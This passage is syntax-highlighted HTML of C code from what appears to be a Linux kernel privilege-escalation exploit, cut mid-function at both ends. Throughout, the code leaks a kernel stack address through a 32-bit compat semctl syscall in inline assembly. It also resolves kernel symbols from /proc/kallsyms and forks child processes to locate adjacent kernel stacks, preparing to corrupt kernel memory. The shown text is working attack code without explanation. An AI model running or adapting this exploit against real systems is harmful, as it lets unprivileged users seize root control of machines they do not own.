  </span><span style="font-style:italic;color:#c792ea;">char </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">stack_start</span><span style="color:#89ddff;">, *</span><span style="color:#eeffff;">stack_end</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned char </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">p</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> kstack</span><span style="color:#89ddff;">, *</span><span style="color:#eeffff;">ptr</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* make sure our argument is 32-bit accessible */</span><span style="color:#eeffff;">
  arg </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">mmap</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">4096</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> PROT_READ </span><span style="color:#89ddff;">|</span><span style="color:#82aaff;"> PROT_WRITE</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> MAP_ANONYMOUS </span><span style="color:#89ddff;">| </span><span style="color:#82aaff;">
    MAP_PRIVATE </span><span style="color:#89ddff;">|</span><span style="color:#82aaff;"> MAP_32BIT</span><span style="color:#89ddff;">, -</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">arg </span><span style="color:#89ddff;">==</span><span style="color:#eeffff;"> MAP_FAILED</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] failure mapping memory, aborting!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* map a fake stack to use during syscall */</span><span style="color:#eeffff;">
  stack_start </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">mmap</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">4096</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> PROT_READ </span><span style="color:#89ddff;">|</span><span style="color:#82aaff;"> PROT_WRITE</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> MAP_ANONYMOUS </span><span style="color:#89ddff;">|</span><span style="color:#82aaff;">
   MAP_PRIVATE </span><span style="color:#89ddff;">|</span><span style="color:#82aaff;"> MAP_32BIT</span><span style="color:#89ddff;">, -</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">stack_start </span><span style="color:#89ddff;">==</span><span style="color:#eeffff;"> MAP_FAILED</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] failure mapping memory, aborting!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  stack_end </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> stack_start </span><span style="color:#89ddff;">+ </span><span style="color:#f78c6c;">4096</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memset</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">arg</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, sizeof(</span><span style="font-style:italic;color:#c792ea;">union</span><span style="color:#82aaff;"> semun</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memset</span><span style="color:#89ddff;">(&amp;</span><span style="color:#82aaff;">amp</span><span style="color:#89ddff;">;</span><span style="color:#82aaff;">dummy</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, sizeof(</span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#82aaff;"> semid_ds</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
  arg</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">buf </span><span style="color:#89ddff;">= &amp;</span><span style="color:#eeffff;">amp</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">dummy</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* syscall(NR_IPC, SEMCTL, 0, 0, IPC_SET, arg) */</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">asm </span><span style="color:#c792ea;">volatile </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">push </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rax</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">push </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rbx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">push </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rcx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">push </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rdx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">push </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rsi</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">push </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rdi</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movl %0, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">eax</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movl %1, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">ebx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movl %2, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">ecx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movl %3, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">edx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movl %4, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">esi</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movq %5, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rdi</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movq </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rsp, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">r8</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movq %6, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rsp</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">push </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">r8</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">int $0x80</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">pop </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">r8</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">movq </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">r8, </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rsp</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">pop </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rdi</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">pop </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rsi</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">pop </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rdx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">pop </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rcx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">pop </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rbx</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">pop </span><span style="color:#eeffff;">%%</span><span style="color:#c3e88d;">rax</span><span style="color:#89ddff;">\n&quot;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">:</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#eeffff;">NR_IPC</span><span style="color:#89ddff;">), &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#eeffff;">SEMCTL</span><span style="color:#89ddff;">), &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">), &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">), &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#eeffff;">IPC_SET</span><span style="color:#89ddff;">), &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#eeffff;">arg</span><span style="color:#89ddff;">), &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;(</span><span style="color:#eeffff;">stack_end</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">: &quot;</span><span style="color:#c3e88d;">memory</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">rax</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">rbx</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">rcx</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">rdx</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">rsi</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">rdi</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">r8</span><span style="color:#89ddff;">&quot;</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* naively extract a pointer to the kstack from the kstack */</span><span style="color:#eeffff;">
  p </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> stack_end </span><span style="color:#89ddff;">- (sizeof(</span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#89ddff;">) + sizeof(</span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> semid64_ds</span><span style="color:#89ddff;">)) +</span><span style="color:#eeffff;"> LEAK_OFFSET</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  kstack </span><span style="color:#89ddff;">= *(</span><span style="font-style:italic;color:#c792ea;">unsigned long </span><span style="color:#89ddff;">*)</span><span style="color:#eeffff;"> p</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">kstack </span><span style="color:#89ddff;">&lt;</span><span style="color:#eeffff;"> LEAK_BASE </span><span style="color:#89ddff;">||</span><span style="color:#eeffff;"> kstack </span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;"> LEAK_TOP</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] failed to leak a suitable kstack address, try again!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">kstack </span><span style="color:#89ddff;">% 0x</span><span style="color:#f78c6c;">1000</span><span style="color:#89ddff;">) &lt; (0x</span><span style="color:#f78c6c;">1000 </span><span style="color:#89ddff;">-</span><span style="color:#eeffff;"> LEAK_DEPTH</span><span style="color:#89ddff;">)) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] failed to leak a suitable kstack address, try again!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  kstack </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> kstack </span><span style="color:#89ddff;">&amp;</span><span style="color:#eeffff;">amp</span><span style="color:#89ddff;">; ~0x</span><span style="color:#f78c6c;">1fff</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
   </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return</span><span style="color:#eeffff;"> kstack</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;">
</span><span style="color:#82aaff;">get_symbol</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">char </span><span style="color:#89ddff;">*</span><span style="color:#f78c6c;">name</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  FILE </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">f</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> addr</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> dummy</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> sym</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">512</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> ret </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#eeffff;">
  f </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">fopen</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">/proc/kallsyms</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">r</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(!</span><span style="color:#eeffff;">f</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">while </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">ret </span><span style="color:#89ddff;">!=</span><span style="color:#eeffff;"> EOF</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    ret </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">fscanf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">f</span><span style="color:#89ddff;">, &quot;</span><span style="color:#eeffff;">%p %c %s</span><span style="color:#89ddff;">\n&quot;, (</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#89ddff;">**) &amp;</span><span style="color:#82aaff;">amp</span><span style="color:#89ddff;">;</span><span style="color:#82aaff;">addr</span><span style="color:#89ddff;">, &amp;</span><span style="color:#82aaff;">amp</span><span style="color:#89ddff;">;</span><span style="color:#82aaff;">dummy</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> sym</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">ret </span><span style="color:#89ddff;">== </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">fscanf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">f</span><span style="color:#89ddff;">, &quot;</span><span style="color:#eeffff;">%s</span><span style="color:#89ddff;">\n&quot;,</span><span style="color:#82aaff;"> sym</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">continue</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(!</span><span style="color:#82aaff;">strcmp</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">name</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> sym</span><span style="color:#89ddff;">)) {</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] resolved symbol </span><span style="color:#eeffff;">%s</span><span style="color:#c3e88d;"> to </span><span style="color:#eeffff;">%p</span><span style="color:#89ddff;">\n&quot;,</span><span style="color:#82aaff;"> name</span><span style="color:#89ddff;">, (</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#89ddff;">*)</span><span style="color:#82aaff;"> addr</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">fclose</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">f</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">return</span><span style="color:#eeffff;"> addr</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">fclose</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">f</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;">
</span><span style="color:#82aaff;">get_adjacent_kstacks</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> i</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> ret</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> shm</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> pid</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> type</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* create shared communication channel between parent and its children */</span><span style="color:#eeffff;">
  shm </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">shm_open</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">/halfnelson</span><span style="color:#89ddff;">&quot;,</span><span style="color:#82aaff;"> O_RDWR </span><span style="color:#89ddff;">|</span><span style="color:#82aaff;"> O_CREAT</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> S_IRWXU </span><span style="color:#89ddff;">|</span><span style="color:#82aaff;"> S_IRWXG </span><span style="color:#82aaff;">
    </span><span style="color:#89ddff;">|</span><span style="color:#82aaff;"> S_IRWXO</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">shm </span><span style="color:#89ddff;">&lt; </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] failed creating shared memory, aborting!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  ret </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">ftruncate</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">shm</span><span style="color:#89ddff;">, sizeof(</span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#82aaff;"> region</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">ret </span><span style="color:#89ddff;">!= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] failed resizing shared memory, aborting!</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  region </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">mmap</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">, sizeof(</span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#82aaff;"> region</span><span style="color:#89ddff;">),</span><span style="color:#82aaff;"> PROT_READ </span><span style="color:#89ddff;">|</span><span style="color:#82aaff;"> PROT_WRITE</span><span style="color:#89ddff;">, </span><span style="color:#82aaff;">
    MAP_SHARED</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> shm</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memset</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">region</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> KSTACK_UNINIT</span><span style="color:#89ddff;">, sizeof(</span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#82aaff;"> region</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* parent kstack self-discovery */</span><span style="color:#eeffff;">
  region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">parent </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">get_kstack</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] found parent kstack at 0x</span><span style="color:#eeffff;">%lx</span><span style="color:#89ddff;">\n&quot;,</span><span style="color:#82aaff;"> region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">parent</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* fork and discover children with adjacently-allocated kernel stacks */</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">for </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">i </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;"> i </span><span style="color:#89ddff;">&lt;</span><span style="color:#eeffff;"> NPROC</span><span style="color:#89ddff;">; ++</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    pid </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">fork</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">pid </span><span style="color:#89ddff;">&gt; </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      type </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> KSTACK_PARENT</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">continue</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">} </span><span style="font-style:italic;color:#c792ea;">else if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">pid </span><span style="color:#89ddff;">== </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#4a4a4a;">/* children do kstack self-discovery */</span><span style="color:#eeffff;">
      region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">addrs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">] = </span><span style="color:#82aaff;">get_kstack</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
 </span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#4a4a4a;">/* children sleep until parent has found adjacent children */</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">while </span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
        </span><span style="color:#82aaff;">sleep</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
        </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">region</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">addrs</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">] ==</span><span style="color:#eeffff;"> KSTACK_DIE</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
